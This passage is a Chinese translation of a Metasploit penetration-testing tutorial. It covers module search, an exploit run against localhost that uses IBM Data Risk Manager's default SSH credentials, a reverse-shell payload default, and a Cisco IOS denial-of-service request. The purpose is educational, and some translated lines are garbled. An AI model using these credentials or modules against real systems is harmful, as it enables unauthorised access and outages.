<html>
<head>
<title>Metasploit Penetration Testing Framework</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Metasploit渗透测试框架</h1>
<blockquote>原文：<a href="https://levelup.gitconnected.com/ethical-hacking-part-7-metasploit-penetration-testing-framework-b768dac407a?source=collection_archive---------3-----------------------#2020-10-15">https://levelup.gitconnected.com/ethical-hacking-part-7-metasploit-penetration-testing-framework-b768dac407a?source=collection_archive---------3-----------------------#2020-10-15</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="3b4d" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">了解风险以防止攻击的道德黑客—测试安全性和识别漏洞的框架</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/2e7746abbfdf5f5d56079f64d34cc4a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CjKgQ-vTdeKAB3uJ5nqUHQ.jpeg"/></div></div></figure><p id="5bba" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">Metasploit是一个非常强大的开源渗透测试框架。它提供了有关软件漏洞、IDS签名开发和渗透测试的信息。该工具可用于针对远程目标设备执行和开发漏洞利用代码。<a class="ae lq" href="https://www.metasploit.com/" rel="noopener ugc nofollow" target="_blank"> Metasploit </a>本身并不违法，但这真的取决于你用它做什么。</p><p id="4689" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我假设你已经阅读了我的另一篇文章，“<a class="ae lq" rel="noopener ugc nofollow" target="_blank" href="/ethical-hacking-part-2-introducing-kali-linux-37362fafe28b">伦理黑客(第2部分):Kali Linux简介</a>”，并且有一个Kali Linux实例可以跟随本教程。作为标准配置，Metasploit 与Kali Linux捆绑在一起。如果你没有使用Kali Linux，你仍然可以从这里下载并安装Metasploit。</p><h1 id="8248" class="lr ls it bd lt lu lv lw lx ly lz ma mb jz mc ka md kc me kd mf kf mg kg mh mi bi translated">让我们开始吧…</h1><p id="82e4" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">最好确保Metasploit是最新的。建议经常检查，建议每周检查一次。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="500e" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ <strong class="mp iu">sudo apt update -y; sudo apt install metasploit-framework -y</strong></span></pre><p id="db07" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">像这样启动Metasploit控制台。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="c8e4" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ <strong class="mp iu">msfconsole</strong> <br/>                                                  <br/>     ,           ,<br/>    /             \<br/>   ((__---,,,---__))<br/>      (_) O O (_)_________<br/>         \ _ /            |\<br/>          o_o \   M S F   | \<br/>               \   _____  |  *<br/>                |||   WW|||<br/>                |||     |||</span><span id="269a" class="mt ls it mp b gy my mv l mw mx">=[ metasploit v5.0.101-dev                         ]<br/>+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]<br/>+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]<br/>+ -- --=[ 7 evasion                                       ]</span><span id="2c63" class="mt ls it mp b gy my mv l mw mx">Metasploit tip: To save all commands executed since start up to a file, use the makerc command</span><span id="a0af" class="mt ls it mp b gy my mv l mw mx">msf5 &gt;</span></pre><p id="e2a0" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">在控制台中，您可以随时寻求帮助。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="7cd3" class="mt ls it mp b gy mu mv l mw mx">msf5 &gt; <strong class="mp iu">help</strong></span></pre><p id="4f84" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">您可以根据您的目标搜索模块。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="4243" class="mt ls it mp b gy mu mv l mw mx">msf5 &gt; <strong class="mp iu">search cisco</strong></span></pre><p id="f054" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">实际上，这可能是一个快速绕道并涵盖道德黑客和渗透测试的一个重要部分的好时机，那就是<strong class="kw iu">信息收集</strong>。有许多工具可用，但是<a class="ae lq" href="https://tools.kali.org/information-gathering/nmap" rel="noopener ugc nofollow" target="_blank"> Nmap </a>可能是您的测试起点。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="72b7" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ <strong class="mp iu">nmap -p- -A localhost</strong><br/>Starting Nmap 7.91 ( <a class="ae lq" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2020-10-15 16:24 BST<br/>Nmap scan report for localhost (127.0.0.1)<br/>Host is up (0.000045s latency).<br/>Other addresses for localhost (not scanned): ::1<br/>Not shown: 65534 closed ports<br/>PORT   STATE SERVICE VERSION<br/>22/tcp open  ssh     OpenSSH 8.3p1 Debian 1 (protocol 2.0)<br/>| ssh-hostkey: <br/>|   3072 d3:21:10:b8:02:14:5e:13:de:15:98:8f:a8:a9:5a:2a (RSA)<br/>|   256 c7:54:c4:44:5b:cf:68:f3:29:9a:16:b1:17:ca:99:75 (ECDSA)<br/>|_  256 05:f0:7b:8d:52:c5:42:56:f9:b2:30:44:92:50:f6:59 (ED25519)<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><span id="902c" class="mt ls it mp b gy my mv l mw mx">Service detection performed. Please report any incorrect results at <a class="ae lq" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .<br/>Nmap done: 1 IP address (1 host up) scanned in 1.11 seconds</span></pre><p id="7ec1" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated"><a class="ae lq" href="https://tools.kali.org/information-gathering/nmap" rel="noopener ugc nofollow" target="_blank"> Nmap </a>允许您扫描主机以识别它，还可以找出它正在提供什么服务。有了这些信息，你就可以进入<a class="ae lq" href="https://www.exploit-db.com/" rel="noopener ugc nofollow" target="_blank">漏洞数据库</a>或者在<a class="ae lq" href="https://www.metasploit.com/" rel="noopener ugc nofollow" target="_blank"> Metasploit </a>中搜索模块。我刚刚扫描了我的本地Kali实例，我可以看到一个SSH服务器已经启用。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="88ba" class="mt ls it mp b gy mu mv l mw mx">msf5 &gt; <strong class="mp iu">search linux</strong></span><span id="014a" class="mt ls it mp b gy my mv l mw mx">msf5 &gt; <strong class="mp iu">search ssh</strong></span></pre><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi mz"><img src="../Images/ae6fccd3fc510533f87366ab80fddbc5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WIxGLnLALoDhQ9E9uyh5fg.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi na"><img src="../Images/787ecef8dea9a70a281ca8e119d6280f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*irBL0lJKu1IxQOgPsGhD9A.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nb"><img src="../Images/d185bb47cbae130ae462d27070ab5fad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*65J49pUTttPHTqSNJsDy0Q.png"/></div></div></figure><p id="1a2b" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">…这是给“宋承宪一个人的。几乎所有你能想到的都会在Metasploit中返回结果。</p><p id="cc49" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">如果你键入"<strong class="kw iu">help</strong><em class="nc">&lt;command&gt;</em>"，例如"<strong class="kw iu"> help search </strong>"它为你提供了很多关于如何使用该命令的有用信息。例如，您可能不知道您也可以过滤您的搜索，这在帮助中有解释。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="6dc0" class="mt ls it mp b gy mu mv l mw mx">Examples:<br/>  search cve:2009 type:exploit<br/>  search cve:2009 type:exploit platform:-linux</span></pre><p id="79b7" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">让我们试试这个…</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="7ef0" class="mt ls it mp b gy mu mv l mw mx">msf5 &gt; <strong class="mp iu">search cve:2020 type:exploit platform:-linux ssh</strong></span></pre><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi nd"><img src="../Images/929359c872aa280a18f9dee9c646df53.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EhjxcuzA6_sd4JJTMLE9Mg.png"/></div></div></figure><p id="b952" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">我们正在寻找2020年Linux平台上的SSH利用。</p><p id="c5b9" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">那么这实际上是做什么的呢？</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="ce21" class="mt ls it mp b gy mu mv l mw mx">msf5 &gt; <strong class="mp iu">info exploit/linux/ssh/ibm_drm_a3user</strong></span><span id="cd55" class="mt ls it mp b gy my mv l mw mx">Name: IBM Data Risk Manager a3user Default Password<br/>     Module: exploit/linux/ssh/ibm_drm_a3user<br/>   Platform: Unix<br/>       Arch: cmd<br/> Privileged: Yes<br/>    License: Metasploit Framework License (BSD)<br/>       Rank: Excellent<br/>  Disclosed: 2020-04-21</span><span id="34ac" class="mt ls it mp b gy my mv l mw mx">Provided by:<br/>  Pedro Ribeiro &lt;<a class="ae lq" href="mailto:pedrib@gmail.com" rel="noopener ugc nofollow" target="_blank">pedrib@gmail.com</a>&gt;</span><span id="4b33" class="mt ls it mp b gy my mv l mw mx">Available targets:<br/>  Id  Name<br/>  --  ----<br/>  0   IBM Data Risk Manager &lt;= 2.0.6.1</span><span id="cb23" class="mt ls it mp b gy my mv l mw mx">Check supported:<br/>  No</span><span id="c1d2" class="mt ls it mp b gy my mv l mw mx">Basic options:<br/>  Name      Current Setting  Required  Description<br/>  ----      ---------------  --------  -----------<br/>  PASSWORD  idrm             yes       Password to login with<br/>  RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'<br/>  RPORT     22               yes       The target port<br/>  USERNAME  a3user           yes       Username to login with</span><span id="9b2e" class="mt ls it mp b gy my mv l mw mx">Payload information:</span><span id="b0c2" class="mt ls it mp b gy my mv l mw mx">Description:<br/>  This module abuses a known default password in IBM Data Risk <br/>  Manager. The 'a3user' has the default password 'idrm' and allows an <br/>  attacker to log in to the virtual appliance via SSH. This can be <br/>  escalate to full root access, as 'a3user' has sudo access with the <br/>  default password. At the time of disclosure this was an 0day, but it <br/>  was later confirmed and patched by IBM. Versions &lt;= 2.0.6.1 are <br/>  confirmed to be vulnerable.</span><span id="8b0f" class="mt ls it mp b gy my mv l mw mx">References:<br/>  <a class="ae lq" href="https://cvedetails.com/cve/CVE-2020-4429/" rel="noopener ugc nofollow" target="_blank">https://cvedetails.com/cve/CVE-2020-4429/</a><br/>  <a class="ae lq" href="https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md" rel="noopener ugc nofollow" target="_blank">https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md</a><br/>  <a class="ae lq" href="https://seclists.org/fulldisclosure/2020/Apr/33" rel="noopener ugc nofollow" target="_blank">https://seclists.org/fulldisclosure/2020/Apr/33</a><br/>  <a class="ae lq" href="https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/" rel="noopener ugc nofollow" target="_blank">https://www.ibm.com/blogs/psirt/security-bulletin-vulnerabilities-exist-in-ibm-data-risk-manager-cve-2020-4427-cve-2020-4428-cve-2020-4429-and-cve-2020-4430/</a></span></pre><h1 id="3b75" class="lr ls it bd lt lu lv lw lx ly lz ma mb jz mc ka md kc me kd mf kf mg kg mh mi bi translated">剥削时间到了！</h1><p id="3e29" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">虽然这与我的Kali Linux SSH服务器无关，但我们将继续以它为例。下一步是告诉Metasploit我们想要利用这个漏洞。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="7e3b" class="mt ls it mp b gy mu mv l mw mx">msf5 &gt; <strong class="mp iu">use exploit/linux/ssh/ibm_drm_a3user</strong><br/>[*] No payload configured, defaulting to cmd/unix/interact<br/>msf5 exploit(linux/ssh/ibm_drm_a3user) &gt;</span></pre><p id="9a57" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">现在我们需要配置选项…</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="27a3" class="mt ls it mp b gy mu mv l mw mx">msf5 exploit(linux/ssh/ibm_drm_a3user) &gt; <strong class="mp iu">options</strong></span><span id="9bce" class="mt ls it mp b gy my mv l mw mx">Module options (exploit/linux/ssh/ibm_drm_a3user):</span><span id="337f" class="mt ls it mp b gy my mv l mw mx">Name      Current Setting  Required  Description<br/>   ----      ---------------  --------  -----------<br/>   PASSWORD  idrm             yes       Password to login with<br/>   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'<br/>   RPORT     22               yes       The target port<br/>   USERNAME  a3user           yes       Username to login with</span><span id="fc15" class="mt ls it mp b gy my mv l mw mx">Payload options (cmd/unix/interact):</span><span id="fc76" class="mt ls it mp b gy my mv l mw mx">Name  Current Setting  Required  Description<br/>   ----  ---------------  --------  -----------</span><span id="1cf1" class="mt ls it mp b gy my mv l mw mx">Exploit target:</span><span id="ab22" class="mt ls it mp b gy my mv l mw mx">Id  Name<br/>   --  ----<br/>   0   IBM Data Risk Manager &lt;= 2.0.6.1</span></pre><p id="63b2" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">现在我们使用"<strong class="kw iu"> set </strong>命令来设置各种选项。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="1d59" class="mt ls it mp b gy mu mv l mw mx">msf5 exploit(linux/ssh/ibm_drm_a3user) &gt; <strong class="mp iu">set RHOSTS localhost</strong><br/>RHOSTS =&gt; localhost</span></pre><p id="4240" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">一旦你设置了所有你想要的选项，只需运行“<strong class="kw iu"> exploit </strong>”。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="ec2a" class="mt ls it mp b gy mu mv l mw mx">msf5 exploit(linux/ssh/ibm_drm_a3user) &gt; <strong class="mp iu">exploit</strong><br/>[*] Exploiting target 0.0.0.1</span><span id="ba72" class="mt ls it mp b gy my mv l mw mx">[*] 0.0.0.1:22 - Attempting to log in to the IBM Data Risk Manager appliance...</span></pre><p id="029b" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这太疯狂了。</p><p id="1a58" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">Metasploit中的“<strong class="kw iu"> search </strong>”功能非常强大，但是还有另一种方法可以找到可用的内容。</p><h1 id="6568" class="lr ls it bd lt lu lv lw lx ly lz ma mb jz mc ka md kc me kd mf kf mg kg mh mi bi translated">还有哪些漏洞利用模块可用？</h1><p id="9207" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">有两种方法可以找到答案。第一种方法是从“<strong class="kw iu"> msfconsole </strong>”中再次运行“<strong class="kw iu"> banner </strong>”。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="1d19" class="mt ls it mp b gy mu mv l mw mx">msf5 &gt; <strong class="mp iu">banner</strong><br/># cowsay++<br/> ____________<br/>&lt; metasploit &gt;<br/> ------------<br/>       \   ,__,<br/>        \  (oo)____<br/>           (__)    )\<br/>              ||--|| *</span><span id="a502" class="mt ls it mp b gy my mv l mw mx">=[ metasploit v5.0.101-dev                         ]<br/><strong class="mp iu">+ -- --=[ 2049 exploits - 1108 auxiliary - 344 post       ]<br/>+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]<br/>+ -- --=[ 7 evasion                                       ]</strong></span><span id="3365" class="mt ls it mp b gy my mv l mw mx">Metasploit tip: You can use help to view all available commands</span></pre><p id="0292" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">正如你所看到的，在写这篇文章的时候，有2049个漏洞，1108个辅助，344个帖子，562个有效载荷，45个编码器，10个nop和7个逃避。</p><p id="f32c" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">第二种方法是退出"<strong class="kw iu"> msfconsole </strong>"并浏览到Metasploit framework "<strong class="kw iu">modules</strong>"目录。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="5082" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ l<strong class="mp iu">s -l /usr/share/metasploit-framework/modules/exploits</strong><br/>total 100<br/>drwxr-xr-x  3 root root 4096 Oct  1 14:35 aix<br/>drwxr-xr-x  6 root root 4096 Oct  1 14:00 android<br/>drwxr-xr-x  5 root root 4096 Oct  1 14:00 apple_ios<br/>drwxr-xr-x  3 root root 4096 Oct  1 14:00 bsd<br/>drwxr-xr-x  3 root root 4096 Oct  1 14:00 bsdi<br/>drwxr-xr-x  3 root root 4096 Oct  1 14:00 dialup<br/>-rw-r--r--  1 root root 6491 Jul 29 23:36 example_linux_priv_esc.rb<br/>-rw-r--r--  1 root root 2700 Jul 29 23:36 example.rb<br/>-rw-r--r--  1 root root 6396 Jul 29 23:36 example_webapp.rb<br/>drwxr-xr-x  3 root root 4096 Oct  1 14:00 firefox<br/>drwxr-xr-x  9 root root 4096 Oct  1 14:00 freebsd<br/>drwxr-xr-x  3 root root 4096 Oct  1 14:00 hpux<br/>drwxr-xr-x  3 root root 4096 Oct  1 14:00 irix<br/>drwxr-xr-x 23 root root 4096 Oct  1 14:00 linux<br/>drwxr-xr-x  3 root root 4096 Oct  1 14:00 mainframe<br/>drwxr-xr-x 27 root root 4096 Oct  1 14:35 multi<br/>drwxr-xr-x  4 root root 4096 Oct  1 14:00 netware<br/>drwxr-xr-x  3 root root 4096 Oct  1 14:00 openbsd<br/>drwxr-xr-x 13 root root 4096 Oct  1 14:00 osx<br/>drwxr-xr-x  4 root root 4096 Oct  1 14:00 qnx<br/>drwxr-xr-x  8 root root 4096 Oct  1 14:00 solaris<br/>drwxr-xr-x 14 root root 4096 Oct  1 14:00 unix<br/>drwxr-xr-x 52 root root 4096 Oct  1 14:00 windows</span></pre><p id="00e9" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">或者更具体一些，比如“<strong class="kw iu">火狐</strong>漏洞。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="284b" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ ls -l /usr/share/metasploit-framework/modules/exploits/firefox/local<br/>total 4<br/>-rw-r--r-- 1 root root 1893 Jul 29 23:36 exec_shellcode.rb</span></pre><p id="39c1" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">这就是它在Metasploit中的用法。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="09dd" class="mt ls it mp b gy mu mv l mw mx">msf5 &gt; <strong class="mp iu">info exploit/firefox/local/exec_shellcode</strong></span><span id="96d6" class="mt ls it mp b gy my mv l mw mx">Name: Firefox Exec Shellcode from Privileged Javascript Shell<br/>     Module: exploit/firefox/local/exec_shellcode<br/>   Platform: Firefox<br/>       Arch: <br/> Privileged: No<br/>    License: Metasploit Framework License (BSD)<br/>       Rank: Excellent<br/>  Disclosed: 2014-03-10</span><span id="658a" class="mt ls it mp b gy my mv l mw mx">Provided by:<br/>  joev &lt;<a class="ae lq" href="mailto:joev@metasploit.com" rel="noopener ugc nofollow" target="_blank">joev@metasploit.com</a>&gt;</span><span id="f055" class="mt ls it mp b gy my mv l mw mx">Available targets:<br/>  Id  Name<br/>  --  ----<br/>  0   Native Payload</span><span id="dd07" class="mt ls it mp b gy my mv l mw mx">Check supported:<br/>  No</span><span id="ab96" class="mt ls it mp b gy my mv l mw mx">Basic options:<br/>  Name     Current Setting  Required  Description<br/>  ----     ---------------  --------  -----------<br/>  SESSION                   yes       The session to run this module on.<br/>  TIMEOUT  90               yes       Maximum time (seconds) to wait for a response</span><span id="5a0e" class="mt ls it mp b gy my mv l mw mx">Payload information:</span><span id="84e5" class="mt ls it mp b gy my mv l mw mx">Description:<br/>  This module allows execution of native payloads from a privileged <br/>  Firefox Javascript shell. It places the specified payload into <br/>  memory, adds the necessary protection flags, and calls it, which can <br/>  be useful for upgrading a Firefox javascript shell to a Meterpreter <br/>  session without touching the disk.</span><span id="0ae7" class="mt ls it mp b gy my mv l mw mx">msf5 &gt; <strong class="mp iu">use exploit/firefox/local/exec_shellcode</strong><br/>[*] No payload configured, defaulting to linux/aarch64/meterpreter/reverse_tcp</span></pre><h1 id="0845" class="lr ls it bd lt lu lv lw lx ly lz ma mb jz mc ka md kc me kd mf kf mg kg mh mi bi translated">有哪些非漏洞模块可用？</h1><p id="650d" class="pw-post-body-paragraph ku kv it kw b kx mj ju kz la mk jx lc ld ml lf lg lh mm lj lk ll mn ln lo lp im bi translated">Metasploit中的任何非利用模块都被称为辅助模块，不附带有效载荷，而利用模块附带有效载荷。辅助模块是框架的一个特性，允许它为开发之外的各种目的进行扩展。例如，让我们看看拒绝服务(DoS)辅助。</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="8dd1" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ <strong class="mp iu">ls -l /usr/share/metasploit-framework/modules/auxiliary</strong><br/>total 100<br/>drwxr-xr-x 46 root root  4096 Oct  1 14:00 admin<br/>drwxr-xr-x  2 root root  4096 Oct  1 14:35 analyze<br/>drwxr-xr-x  2 root root  4096 Oct  1 14:35 bnat<br/>drwxr-xr-x  8 root root  4096 Oct  1 14:35 client<br/>drwxr-xr-x  3 root root  4096 Oct  1 14:00 cloud<br/>drwxr-xr-x  2 root root  4096 Oct  1 14:35 crawler<br/>drwxr-xr-x  2 root root  4096 Oct  1 14:35 docx<br/>drwxr-xr-x 27 root root  4096 Oct  1 14:00 <strong class="mp iu">dos</strong><br/>-rw-r--r--  1 root root  1490 Jul 29 23:36 example.rb<br/>drwxr-xr-x  2 root root  4096 Oct  1 14:35 fileformat<br/>drwxr-xr-x 10 root root  4096 Oct  1 14:00 fuzzers<br/>drwxr-xr-x  2 root root 20480 Oct  1 14:35 gather<br/>drwxr-xr-x  2 root root  4096 Oct  1 14:35 parser<br/>drwxr-xr-x  3 root root  4096 Oct  1 14:00 pdf<br/>drwxr-xr-x 86 root root  4096 Oct  1 14:00 scanner<br/>drwxr-xr-x  4 root root  4096 Oct  1 14:35 server<br/>drwxr-xr-x  2 root root  4096 Oct  1 14:35 sniffer<br/>drwxr-xr-x  9 root root  4096 Oct  1 14:00 spoof<br/>drwxr-xr-x  4 root root  4096 Oct  1 14:00 sqli<br/>drwxr-xr-x  2 root root  4096 Oct  1 14:35 voip<br/>drwxr-xr-x  5 root root  4096 Oct  1 14:00 vsploit</span><span id="b8f4" class="mt ls it mp b gy my mv l mw mx">kali@kali:~$ <strong class="mp iu">ls -l /usr/share/metasploit-framework/modules/auxiliary/dos</strong><br/>total 100<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 android<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 apple_ios<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 cisco<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 dhcp<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 dns<br/>drwxr-xr-x  3 root root 4096 Oct  1 14:00 freebsd<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 hp<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 http<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 mdns<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 misc<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 ntp<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 pptp<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 rpc<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 samba<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 sap<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 scada<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 smb<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 smtp<br/>drwxr-xr-x  3 root root 4096 Oct  1 14:00 solaris<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 ssl<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 syslog<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 tcp<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 upnp<br/>drwxr-xr-x 14 root root 4096 Oct  1 14:00 windows<br/>drwxr-xr-x  2 root root 4096 Oct  1 14:35 wireshark</span></pre><p id="f7e4" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">也许更确切地说是思科DoS模块？</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="da8c" class="mt ls it mp b gy mu mv l mw mx">kali@kali:~$ <strong class="mp iu">ls -l /usr/share/metasploit-framework/modules/auxiliary/dos/cisco</strong><br/>total 8<br/>-rw-r--r-- 1 root root 1876 Jul 29 23:36 ios_http_percentpercent.rb<br/>-rw-r--r-- 1 root root 1764 Jul 29 23:36 ios_telnet_rocem.rb</span></pre><p id="d44e" class="pw-post-body-paragraph ku kv it kw b kx ky ju kz la lb jx lc ld le lf lg lh li lj lk ll lm ln lo lp im bi translated">那个IOS HTTP Percent模块听起来很有意思？</p><pre class="kj kk kl km gt mo mp mq mr aw ms bi"><span id="42e2" class="mt ls it mp b gy mu mv l mw mx">msf5 &gt; <strong class="mp iu">info auxiliary/dos/cisco/ios_http_percentpercent</strong></span><span id="b69b" class="mt ls it mp b gy my mv l mw mx">Name: Cisco IOS HTTP GET /%% Request Denial of Service<br/>     Module: auxiliary/dos/cisco/ios_http_percentpercent<br/>    License: Metasploit Framework License (BSD)<br/>       Rank: Normal<br/>  Disclosed: 2000-04-26</span><span id="053b" class="mt ls it mp b gy my mv l mw mx">Provided by:<br/>  aushack &lt;<a class="ae lq" href="mailto:patrick@osisecurity.com.au" rel="noopener ugc nofollow" target="_blank">patrick@osisecurity.com.au</a>&gt;</span><span id="9dba" class="mt ls it mp b gy my mv l mw mx">Check supported:<br/>  No</span><span id="4d12" class="mt ls it mp b gy my mv l mw mx">Basic options:<br/>  Name    Current Setting  Required  Description<br/>  ----    ---------------  --------  -----------<br/>  RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'<br/>  RPORT   80               yes       The target port (TCP)</span><span id="2c72" class="mt ls it mp b gy my mv l mw mx">Description:<br/>  This module triggers a Denial of Service condition in the Cisco IOS <br/>  HTTP server. By sending a GET request for "/%%", the device becomes <br/>  unresponsive. IOS 11.1 -&gt; 12.1 are reportedly vulnerable. This <br/>  module tested successfully against a Cisco 1600 Router IOS <br/>  v11.2(18)P.</span><span id="052b" class="mt ls it mp b gy my mv l mw mx">References:<br/>  <a class="ae lq" href="http://www.securityfocus.com/bid/1154" rel="noopener ugc nofollow" target="_blank">http://www.securityfocus.com/bid/1154</a><br/>  <a class="ae lq" href="https://cvedetails.com/cve/CVE-2000-0380/" rel="noopener ugc nofollow" target="_blank">https://cvedetails.com/cve/CVE-2000-0380/</a><br/>  OSVDB (1302)</span><span id="d206" class="mt ls it mp b gy my mv l mw mx">msf5 &gt; <strong class="mp iu">use 